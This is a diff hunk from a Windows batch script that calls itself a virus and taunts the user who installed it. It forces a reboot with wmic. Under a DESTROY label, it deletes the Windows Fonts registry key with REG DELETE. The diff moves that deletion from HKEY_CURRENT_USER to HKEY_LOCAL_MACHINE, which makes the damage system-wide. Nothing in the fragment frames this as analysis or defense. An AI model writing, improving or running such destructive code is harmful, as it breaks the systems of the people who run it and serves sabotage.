@@ -180,7 +180,7 @@ echo you idiot, you installed a virus, now suffer!!!!!!!!!
 echo,
 wmic os where primary=1 reboot
 :DESTROY
-REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Fonts /f
+REG DELETE "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Fonts" /f
 GOTO eeee
 :MAININSTALLB
 cls
